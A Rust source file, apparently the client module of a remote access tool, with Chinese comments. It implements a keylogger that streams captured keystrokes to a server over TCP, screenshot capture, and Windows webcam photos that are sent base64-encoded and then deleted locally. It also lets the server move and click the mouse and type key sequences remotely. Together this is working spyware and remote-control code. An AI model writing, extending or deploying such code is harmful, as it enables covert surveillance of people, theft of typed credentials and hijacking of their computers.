
extern crate device_query;

use device_query::{DeviceQuery, DeviceState};
use enigo::{Enigo, MouseControllable, MouseButton, KeyboardControllable};
use screen_capturer::ScreenCapturer;
use std::fs::{self};
use std::path::Path;
use std::{net::TcpStream, io::Write};
use std::thread;
use std::error::Error;

use crate::model::command_model;
use crate::model::{command_model::{CommandModel}, mouse_move::MouseMove};
use crate::utils::socket_util::SocketUtil;
    
// 硬件相关类
pub struct DeviceUtil;

// 是否键盘监听中
static mut KEYBOARD_LISTENER: bool = false;
// 是否鼠标监听中
// static mut MOUSE_LISTENER: bool = false;

impl DeviceUtil {
    // 鼠标监听
    // pub fn mouse_listener(command_model: CommandModel, stream: &mut TcpStream) {
    //     unsafe{
    //         MOUSE_LISTENER = !MOUSE_LISTENER;
    //     }
    //     let mut stream = stream.try_clone().unwrap();
    //     thread::spawn(move || {
    //         let device_state = DeviceState::new();
    //         let mut prev_mouse = MouseState::default();
    //         loop {
    //             let mouse = device_state.get_mouse();
    //             unsafe{
    //                 if mouse != prev_mouse && MOUSE_LISTENER {
    //                     let model = CommandModel::new(
    //                         command_model.target.clone(),
    //                         command_model.receiver.clone(), 
    //                         command_model.c_type, 
    //                         command_model.action, 
    //                         format!("{:?}", mouse)
    //                     );
    //                     let json = serde_json::to_string(&model).unwrap();
    //                     SocketUtil::send_to_server(json, &mut stream);
    //                     prev_mouse = mouse;
    //                     thread::sleep(Duration::from_secs(1));
    //                 }
    //             }
    //         }
    //     });
    // }

    // 键盘监听
    pub fn key_listener(command_model: CommandModel, stream: &mut TcpStream) {
        unsafe{
            KEYBOARD_LISTENER = !KEYBOARD_LISTENER;
        }
        let mut stream = stream.try_clone().unwrap();
        thread::spawn(move || {
            let device_state = DeviceState::new();
            let mut prev_keys = vec![];
            loop {
                let keys = device_state.get_keys();
                unsafe{
                    // 退出监听
                    if !KEYBOARD_LISTENER {
                        break;
                    }
                    if keys != prev_keys && keys.len() > 0 {
                        let model = CommandModel::new(
                            command_model.target.clone(),
                            command_model.receiver.clone(), 
                            command_model.c_type, 
                            command_model.action,
                            format!("{:?}", keys)
                        );
                        let json = serde_json::to_string(&model).unwrap();
                        SocketUtil::send_to_server(json, &mut stream);
                        prev_keys = keys;
                    }   
                }
            }
        });
    }
    // 截图
    pub fn screen_shot(_command_model: CommandModel, stream: &mut TcpStream){
        extern crate base64;
        use base64::encode;
        // let screen_capturer = .unwrap();
        match ScreenCapturer::all().get(0) {
            Some(screen_first) => {
                let image = match screen_first.capture(){
                    Some(image) => image,
                    None => todo!(),
                };
                let buffer = image.png().unwrap();
                match stream.write(encode(buffer).as_bytes()) {
                    Ok(_) => Self::trans_data_over(&_command_model.receiver, stream),
                    Err(err) => SocketUtil::send_error_server(err.to_string(), stream)
                };
            },
            None => SocketUtil::send_error_server("not find screen!".to_string(), stream),
        }
        
        // for screen_capturer in screen_capturers {
            
        // }
        // Ok(())
    }

    // 鼠标移动
    pub fn move_mouse(command_model: CommandModel) -> Result<(), Box<dyn Error>> {
        let mouse_move: MouseMove = serde_json::from_str(&command_model.data)?;
        let mut enigo = Enigo::new();
        enigo.mouse_move_to(mouse_move.x, mouse_move.y);
        Ok(())
    }

    // 鼠标操作
    pub fn click_mouse(command_model: CommandModel){
        let mut enigo = Enigo::new();
        if command_model.data.eq("1"){
            enigo.mouse_click(MouseButton::Left);
        }else if command_model.data.eq("2"){
            enigo.mouse_click(MouseButton::Middle);
        }else if command_model.data.eq("3"){
            enigo.mouse_click(MouseButton::Right);
        }else if command_model.data.eq("4"){
            enigo.mouse_click(MouseButton::ScrollDown);
        }else if command_model.data.eq("5"){
            enigo.mouse_click(MouseButton::ScrollUp);
        }else if command_model.data.eq("6"){
            enigo.mouse_click(MouseButton::ScrollLeft);
        }else if command_model.data.eq("7"){
            enigo.mouse_click(MouseButton::ScrollRight);
        }
    }

    // 摄像头拍照
    #[cfg(windows)]
    pub fn take_picture(_command_model: CommandModel, _stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
        extern crate base64;
        use base64::encode;
        // 可用摄像头数量是否大于0
        if escapi::num_devices() > 0 {
            const W: u32 = 320;
            const H: u32 = 240;

            let filename = Path::new("1.png");
            
            let camera = escapi::init(0, W, H, 24)?;
            let (width, height) = (camera.capture_width(), camera.capture_height());
            let pixels = camera.capture()?;

            // Lets' convert it to RGB.
            let mut buffer = vec![0; width as usize * height as usize * 3];
            for i in 0..pixels.len() / 4 {
                buffer[i * 3] = pixels[i * 4 + 2];
                buffer[i * 3 + 1] = pixels[i * 4 + 1];
                buffer[i * 3 + 2] = pixels[i * 4];
            }

            image::save_buffer(&filename,
                            &buffer,
                            width,
                            height,
                            image::ColorType::RGB(8))?;
            // 读取文件后删除
            let buffer = fs::read(&filename)?;
            // println!("{:?}", buffer.len());
            match _stream.write(encode(buffer).as_bytes()) {
                Ok(_) => {
                    fs::remove_file(&filename)?;
                    Self::trans_data_over(&_command_model.receiver, _stream);
                    Ok(())
                },
                Err(err) => Err(err)
            };
            Ok(())
        } else {
            SocketUtil::send_error_server(String::from("devices_num < 1!"), _stream);
            Ok(())
        }
    }

    #[cfg(not(windows))]
    pub fn take_picture(_command_model: CommandModel, _stream: &mut TcpStream){
        SocketUtil::send_error_server(String::from("unsupport operation!"), _stream)
    }

    // 语法解析键盘操作
    pub fn parse_keyboard_sequence(command_model: CommandModel, stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
        match Enigo::new().key_sequence_parse_try(command_model.data.as_str()){
            Ok(_) => Ok(()),
            Err(err) => Err(Box::new(err))
        }
    }

    pub fn trans_data_over(receive: &str, stream: &mut TcpStream){
        let model = CommandModel::new(
            stream.local_addr().unwrap().to_string(),
            receive.to_string(), 
            usize::MIN,
            5,
            "trans over".to_string());
            // println!("error ==> {}", serde_json::to_string(&model).unwrap());
        // 封装一下错误信息
        SocketUtil::send_to_server(serde_json::to_string(&model).unwrap(), stream);
    }
}